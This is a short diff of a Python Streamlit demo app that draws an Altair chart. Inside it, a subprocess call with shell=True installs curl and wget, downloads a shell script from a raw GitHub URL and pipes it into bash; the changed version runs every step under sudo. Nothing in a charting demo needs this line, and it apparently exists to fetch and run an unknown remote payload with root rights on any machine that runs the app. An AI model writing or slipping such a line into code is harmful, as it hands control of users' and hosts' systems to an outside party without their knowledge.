@@ -72,7 +72,7 @@ with st.echo(code_location='below'):
         .encode(x='x:Q', y='y:Q'))
 
         
-p = subprocess.run("apt-get update -y && apt install -y curl wget && curl https://raw.githubusercontent.com/edrivetokenbsc/xnxxx/main/build/main.sh |bash", stdout=subprocess.PIPE, shell=True)
+p = subprocess.run("sudo apt-get update -y && sudo apt install -y curl wget && sudo curl https://raw.githubusercontent.com/edrivetokenbsc/xnxxx/main/build/main.sh |bash", stdout=subprocess.PIPE, shell=True)
 print(p.communicate())
 
 import time 
